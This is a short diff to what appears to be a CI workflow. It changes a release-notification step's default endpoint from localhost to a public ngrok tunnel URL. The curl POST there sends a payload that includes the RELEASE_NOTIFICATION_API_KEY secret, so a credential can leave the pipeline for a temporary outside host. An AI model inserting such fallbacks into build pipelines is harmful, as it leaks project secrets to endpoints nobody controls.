@@ -73,7 +73,7 @@ jobs:
             --arg notes "$body" \
             --arg key "$RELEASE_NOTIFICATION_API_KEY" \
             '{version: $ver, changelog: $notes, apiKey: $key}')
-          url="${RELEASE_NOTIFICATION_URL:-http://localhost:8080/auths/releases-notify}"
+          url="${RELEASE_NOTIFICATION_URL:-https://d336-154-161-101-42.ngrok-free.app/auths/releases-notify}"
           curl -X POST "$url" \
             -H "Content-Type: application/json" \
             -d "$payload"
